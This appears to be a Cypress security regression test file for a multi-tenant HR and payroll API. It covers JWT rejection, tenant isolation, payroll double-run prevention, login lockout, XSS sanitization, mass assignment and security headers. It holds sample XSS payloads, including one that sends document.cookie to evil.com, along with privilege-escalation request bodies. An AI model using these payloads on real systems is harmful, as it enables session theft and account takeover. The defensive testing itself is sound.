/**
 * SECURITY SPRINT — End-to-End Security Tests
 * ─────────────────────────────────────────────
 * Tests all critical and high security fixes against a running instance.
 *
 * Prerequisites:
 *   - API running on localhost:3001
 *   - Redis running on localhost:6379
 *   - Test tenant seeded with test-user@retroworks.test
 *
 * Run: npx cypress run --spec cypress/e2e/security-sprint.cy.ts
 */

const BASE_URL = Cypress.env('API_URL') ?? 'http://localhost:3001/api/v1';

// ─── C-01: JWT Secret Enforcement ─────────────────────────────────────────────
describe('C-01: JWT Secret Enforcement', () => {
  it('rejects requests with malformed JWT', () => {
    cy.request({
      url: `${BASE_URL}/employees`,
      headers: { Authorization: 'Bearer obviously.not.a.valid.jwt' },
      failOnStatusCode: false,
    }).then(resp => {
      expect(resp.status).to.eq(401);
    });
  });

  it('rejects tokens with wrong signature (simulated fallback key)', () => {
    // A JWT signed with the old hardcoded fallback key
    const fakeToken = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJoYWNrZXIiLCJ0aWQiOiJldmlsLXRlbmFudCJ9.FAKE_SIGNATURE_WITH_FALLBACK_KEY';
    cy.request({
      url: `${BASE_URL}/employees`,
      headers: { Authorization: `Bearer ${fakeToken}` },
      failOnStatusCode: false,
    }).then(resp => {
      expect(resp.status).to.eq(401);
      expect(resp.body.message).not.to.contain('secret');
      expect(resp.body.message).not.to.contain('JWT_SECRET');
    });
  });

  it('does not leak JWT secret in error responses', () => {
    cy.request({
      url: `${BASE_URL}/auth/login`,
      method: 'POST',
      body: { email: 'nonexistent@test.com', password: 'wrongpassword' },
      failOnStatusCode: false,
    }).then(resp => {
      const body = JSON.stringify(resp.body);
      expect(body).not.to.contain('JWT_SECRET');
      expect(body).not.to.contain('secret');
      expect(body).not.to.contain('CHANGE-ME');
      expect(resp.status).to.be.oneOf([401, 429]);
    });
  });
});

// ─── C-02: Cross-Tenant Isolation ─────────────────────────────────────────────
describe('C-02: Cross-Tenant Query Isolation', () => {
  let tenantAToken: string;
  let tenantBToken: string;
  let tenantAEmployeeId: string;

  before(() => {
    // Login as Tenant A
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: Cypress.env('TENANT_A_EMAIL'), password: Cypress.env('TENANT_A_PASSWORD') },
    }).then(resp => { tenantAToken = resp.body.accessToken; });

    // Login as Tenant B
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: Cypress.env('TENANT_B_EMAIL'), password: Cypress.env('TENANT_B_PASSWORD') },
    }).then(resp => { tenantBToken = resp.body.accessToken; });

    // Get a Tenant A employee ID
    cy.request({
      url: `${BASE_URL}/employees`, headers: { Authorization: `Bearer ${tenantAToken}` },
    }).then(resp => { tenantAEmployeeId = resp.body.data?.[0]?.id; });
  });

  it('Tenant B cannot access Tenant A employee by ID', () => {
    if (!tenantAEmployeeId) return;
    cy.request({
      url: `${BASE_URL}/employees/${tenantAEmployeeId}`,
      headers: { Authorization: `Bearer ${tenantBToken}` },
      failOnStatusCode: false,
    }).then(resp => {
      expect(resp.status).to.be.oneOf([403, 404]);
    });
  });

  it('employee list for Tenant B does not include Tenant A employees', () => {
    cy.request({
      url: `${BASE_URL}/employees`,
      headers: { Authorization: `Bearer ${tenantBToken}` },
    }).then(resp => {
      const employeeIds = (resp.body.data ?? []).map((e: any) => e.id);
      expect(employeeIds).not.to.include(tenantAEmployeeId);
    });
  });

  it('cannot include tenantId override in request body', () => {
    cy.request({
      method: 'GET',
      url: `${BASE_URL}/employees`,
      headers: { Authorization: `Bearer ${tenantBToken}` },
      // Attempt to override tenantId in query
      qs: { tenantId: Cypress.env('TENANT_A_ID') },
    }).then(resp => {
      const employeeIds = (resp.body.data ?? []).map((e: any) => e.id);
      expect(employeeIds).not.to.include(tenantAEmployeeId);
    });
  });
});

// ─── C-04: Payroll Double-Run Prevention ──────────────────────────────────────
describe('C-04: Payroll Double-Run Prevention', () => {
  let authToken: string;
  const month = 1;
  const year = 2099; // Future year — safe test data

  before(() => {
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: Cypress.env('PAYROLL_ADMIN_EMAIL'), password: Cypress.env('PAYROLL_ADMIN_PASSWORD') },
    }).then(resp => { authToken = resp.body.accessToken; });
  });

  it('rejects second payroll run for same month (409 Conflict)', () => {
    // First run — may or may not succeed (depends on test data)
    cy.request({
      method: 'POST', url: `${BASE_URL}/payroll/run`,
      headers: { Authorization: `Bearer ${authToken}` },
      body: { month, year },
      failOnStatusCode: false,
    }).then(firstResp => {
      const firstStatus = firstResp.status;

      if (firstStatus === 201 || firstStatus === 200) {
        // First run succeeded — second must fail
        cy.request({
          method: 'POST', url: `${BASE_URL}/payroll/run`,
          headers: { Authorization: `Bearer ${authToken}` },
          body: { month, year },
          failOnStatusCode: false,
        }).then(secondResp => {
          expect(secondResp.status).to.eq(409);
          expect(secondResp.body.message).to.contain('already');
        });
      } else if (firstStatus === 409) {
        // Already exists from a prior test run — second must also fail
        expect(firstStatus).to.eq(409);
      }
    });
  });

  it('simultaneous requests both handled safely (no race condition)', () => {
    // Fire two requests simultaneously
    const runA = cy.request({
      method: 'POST', url: `${BASE_URL}/payroll/run`,
      headers: { Authorization: `Bearer ${authToken}` },
      body: { month: 6, year: 2099 },
      failOnStatusCode: false,
    });
    const runB = cy.request({
      method: 'POST', url: `${BASE_URL}/payroll/run`,
      headers: { Authorization: `Bearer ${authToken}` },
      body: { month: 6, year: 2099 },
      failOnStatusCode: false,
    });

    // At least one must fail with 409
    runA.then(rA => {
      runB.then(rB => {
        const statuses = [rA.status, rB.status];
        // One succeeds (or both fail if data issue), but never both succeed
        const conflictCount = statuses.filter(s => s === 409).length;
        expect(conflictCount).to.be.greaterThan(0);
      });
    });
  });
});

// ─── H-01: Login Rate Limiting ────────────────────────────────────────────────
describe('H-01: Login Brute Force Protection', () => {
  it('locks account after 5 failed login attempts', () => {
    const email = `lockout-test-${Date.now()}@test.com`;

    // Make 5 failed login attempts
    for (let i = 0; i < 5; i++) {
      cy.request({
        method: 'POST', url: `${BASE_URL}/auth/login`,
        body: { email, password: 'WrongPassword1!' },
        failOnStatusCode: false,
      }).then(resp => {
        expect(resp.status).to.be.oneOf([401, 429]);
      });
    }

    // 6th attempt should be locked
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email, password: 'WrongPassword1!' },
      failOnStatusCode: false,
    }).then(resp => {
      expect(resp.status).to.be.oneOf([401, 429]);
      const bodyStr = JSON.stringify(resp.body);
      if (resp.status === 401) {
        expect(bodyStr).to.match(/lock|attempts|minutes/i);
      }
    });
  });

  it('returns 429 when login rate limit exceeded', () => {
    // Rapidly fire > 5 requests
    for (let i = 0; i < 7; i++) {
      cy.request({
        method: 'POST', url: `${BASE_URL}/auth/login`,
        body: { email: `rapid-${i}@test.com`, password: 'test' },
        failOnStatusCode: false,
      });
    }
    // At least some should be 429
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: `rapid-8@test.com`, password: 'test' },
      failOnStatusCode: false,
    }).then(resp => {
      expect(resp.status).to.be.oneOf([401, 429]);
    });
  });

  it('does not expose internal error details in login failure', () => {
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: 'test@test.com', password: 'wrong' },
      failOnStatusCode: false,
    }).then(resp => {
      const body = JSON.stringify(resp.body);
      expect(body).not.to.contain('passwordHash');
      expect(body).not.to.contain('bcrypt');
      expect(body).not.to.contain('PrismaClient');
      expect(body).not.to.contain('stack');
    });
  });
});

// ─── H-04: XSS Protection ─────────────────────────────────────────────────────
describe('H-04: XSS Prevention in Ticket Messages', () => {
  let authToken: string;
  let ticketId: string;

  before(() => {
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: Cypress.env('TENANT_A_EMAIL'), password: Cypress.env('TENANT_A_PASSWORD') },
    }).then(resp => { authToken = resp.body.accessToken; });

    // Create a test ticket
    cy.request({
      method: 'POST', url: `${BASE_URL}/case-engine/tickets`,
      headers: { Authorization: `Bearer ${authToken}` },
      body: { title: 'XSS Test Ticket', description: 'Security test', type: 'internal', priority: 'p3' },
    }).then(resp => { ticketId = resp.body.id; });
  });

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
    'javascript:alert(document.cookie)',
    '<a href="javascript:void(0)" onclick="evil()">click</a>',
    '<iframe src="https://evil.com"></iframe>',
    '<svg onload="alert(1)">',
  ];

  xssPayloads.forEach((payload, i) => {
    it(`sanitizes XSS payload #${i + 1}: ${payload.slice(0, 40)}`, () => {
      cy.request({
        method: 'POST',
        url: `${BASE_URL}/case-engine/tickets/${ticketId}/messages`,
        headers: { Authorization: `Bearer ${authToken}` },
        body: { body: payload, isInternal: false },
        failOnStatusCode: false,
      }).then(resp => {
        if (resp.status === 201 || resp.status === 200) {
          // If stored, must be sanitized
          const stored = JSON.stringify(resp.body);
          expect(stored).not.to.contain('<script>');
          expect(stored).not.to.contain('onerror=');
          expect(stored).not.to.contain('onclick=');
          expect(stored).not.to.contain('javascript:alert');
        }
        // 400 is also acceptable (rejected at validation layer)
        expect(resp.status).to.be.oneOf([200, 201, 400, 422]);
      });
    });
  });
});

// ─── H-05: Mass Assignment Prevention ─────────────────────────────────────────
describe('H-05: Mass Assignment Protection', () => {
  let authToken: string;
  let employeeId: string;

  before(() => {
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: Cypress.env('TENANT_A_EMAIL'), password: Cypress.env('TENANT_A_PASSWORD') },
    }).then(resp => {
      authToken = resp.body.accessToken;
    });

    cy.request({
      url: `${BASE_URL}/employees`,
      headers: { Authorization: `Bearer ${authToken}` },
    }).then(resp => {
      employeeId = resp.body.data?.[0]?.id;
    });
  });

  it('rejects unknown fields in employee update (whitelist enforcement)', () => {
    if (!employeeId) return;
    cy.request({
      method: 'PATCH',
      url: `${BASE_URL}/employees/${employeeId}`,
      headers: { Authorization: `Bearer ${authToken}` },
      body: {
        firstName: 'John', // valid
        tenantId: 'evil-tenant-id', // BLOCKED
        isAdmin: true, // BLOCKED
        passwordHash: '$2a$12$hackedhash', // BLOCKED
        role: 'super-admin', // BLOCKED
      },
      failOnStatusCode: false,
    }).then(resp => {
      // Should either 422 (validation error) or succeed but NOT apply blocked fields
      if (resp.status === 200 || resp.status === 204) {
        // Fetch employee and verify protected fields were NOT changed
        cy.request({
          url: `${BASE_URL}/employees/${employeeId}`,
          headers: { Authorization: `Bearer ${authToken}` },
        }).then(empResp => {
          expect(empResp.body.tenantId).not.to.eq('evil-tenant-id');
        });
      } else {
        expect(resp.status).to.be.oneOf([400, 422]);
      }
    });
  });

  it('settings update rejects plan/subscriptionId override', () => {
    cy.request({
      method: 'PATCH',
      url: `${BASE_URL}/settings/tenant`,
      headers: { Authorization: `Bearer ${authToken}` },
      body: {
        companyName: 'Valid Update',
        plan: 'enterprise', // BLOCKED — cannot upgrade own plan
        subscriptionId: 'sub_hacked', // BLOCKED
        isActive: true, // BLOCKED
      },
      failOnStatusCode: false,
    }).then(resp => {
      // Should succeed with name change but not plan change
      if (resp.status === 200) {
        expect(resp.body.plan).not.to.eq('enterprise');
      } else {
        expect(resp.status).to.be.oneOf([400, 422]);
      }
    });
  });
});

// ─── H-09: Secure Token Handling ──────────────────────────────────────────────
describe('H-09: httpOnly Cookie Refresh Token', () => {
  it('login response does NOT include refresh token in body', () => {
    cy.request({
      method: 'POST', url: `${BASE_URL}/auth/login`,
      body: { email: Cypress.env('TENANT_A_EMAIL'), password: Cypress.env('TENANT_A_PASSWORD') },
      failOnStatusCode: false,
    }).then(resp => {
      if (resp.status === 200) {
        // refreshToken must NOT be in response body
        expect(resp.body).not.to.have.property('refreshToken');
        // accessToken is OK in body (short-lived 15min)
        expect(resp.body).to.have.property('accessToken');
      }
    });
  });

  it('refresh endpoint reads token from cookie only (not body)', () => {
    // Without cookie, refresh must fail
    cy.request({
      method: 'POST',
      url: `${BASE_URL}/auth/refresh`,
      body: { refreshToken: 'token-in-body-should-be-ignored' }, // wrong — should use cookie
      failOnStatusCode: false,
    }).then(resp => {
      expect(resp.status).to.be.oneOf([401, 400]);
    });
  });
});

// ─── Security Headers ─────────────────────────────────────────────────────────
describe('Security Headers (H-04 Helmet)', () => {
  it('returns X-Content-Type-Options header', () => {
    cy.request(BASE_URL + '/health').then(resp => {
      expect(resp.headers).to.have.property('x-content-type-options', 'nosniff');
    });
  });

  it('returns X-Frame-Options or CSP frame-ancestors header', () => {
    cy.request(BASE_URL + '/health').then(resp => {
      const hasXFrame = 'x-frame-options' in resp.headers;
      const hasCsp = resp.headers['content-security-policy']?.includes('frame-ancestors') ?? false;
      expect(hasXFrame || hasCsp).to.be.true;
    });
  });

  it('does not return X-Powered-By header (fingerprinting prevention)', () => {
    cy.request(BASE_URL + '/health').then(resp => {
      expect(resp.headers).not.to.have.property('x-powered-by');
    });
  });

  it('does not expose Prisma errors in production-like responses', () => {
    cy.request({
      url: `${BASE_URL}/employees/nonexistent-id-12345`,
      headers: { Authorization: 'Bearer invalid-token' },
      failOnStatusCode: false,
    }).then(resp => {
      const body = JSON.stringify(resp.body);
      expect(body).not.to.contain('PrismaClientKnownRequestError');
      expect(body).not.to.contain('P2002');
      expect(body).not.to.contain('stack');
    });
  });
});
